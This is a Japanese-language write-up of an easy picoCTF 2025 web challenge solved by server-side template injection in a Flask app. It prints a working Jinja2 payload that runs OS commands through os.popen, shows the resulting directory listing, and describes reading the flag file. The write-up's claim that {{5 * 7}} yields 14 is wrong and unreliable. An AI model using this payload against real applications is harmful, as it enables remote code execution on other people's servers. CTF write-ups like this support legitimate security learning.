#Easy #Web_Exploitation #picoCTF_2025 #browser_webshell_solvable
# Overview
Server Side Template Injectionを利用してRCEの実行
![[Pasted image 20250528090024.png]]

# Server Detail
- Python Flask
	- Formを用いて`HtmlInputElement`内でユーザーインプットを受け取り、その値を`/announce`ルートにPost
	  ![[Screenshot 2025-05-28 at 9.03.10.png]]
	- `/announce`ではPostされた`application/x-www-form-urlencoded`値をHTMLに表示する
	  ![[Screenshot 2025-05-28 at 9.03.23.png]]

# How to Capture the flag
Easy問題であるためflagの取得はシンプルである

1. サーバー側がServer Side Template Injectionに対応しているか調べる
   フレームワークがFlaskであれば、`{{5 * 7}}`は結果として`14`が返ってくる
   他のフレームワークでは`{{}}`などが異なる
2. RCEの実行
   直で`import`などを実行しようとしたが、Internal Server Errorを吐いたため以下のように実行した
   
	`{{request.application.__globals__.__builtins__.__import__('os').popen('ls -lah').read()}}`
	
	これでスクリプトが動いているディレクトリの中身を見れる、以下実行結果
	`total 12K drwxr-xr-x 1 root root 25 May 27 23:28 . drwxr-xr-x 1 root root 23 May 27 23:28 .. drwxr-xr-x 2 root root 32 May 27 23:28 __pycache__ -rwxr-xr-x 1 root root 1.3K Mar 6 03:27 app.py -rw-r--r-- 1 root root 58 Mar 6 19:44 flag -rwxr-xr-x 1 root root 268 Mar 6 03:27 requirements.txt`
	
3. フラグを掴む
   どうやら`./flag`というファイルがあるみたいなので`cat flag`をしてみる
   Gotcha!
   フラグが来ました
![[Screenshot 2025-05-28 at 9.04.16.png]]   
   